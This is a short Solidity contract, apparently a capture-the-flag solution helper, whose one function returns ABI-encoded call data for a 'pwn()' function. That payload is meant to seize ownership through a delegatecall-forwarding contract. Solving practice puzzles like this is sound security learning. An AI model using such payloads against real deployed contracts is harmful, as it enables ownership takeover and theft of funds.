contract CheatDelegation {
    function cheat() public pure returns(bytes memory){
        return abi.encodeWithSignature("pwn()");
    }
}
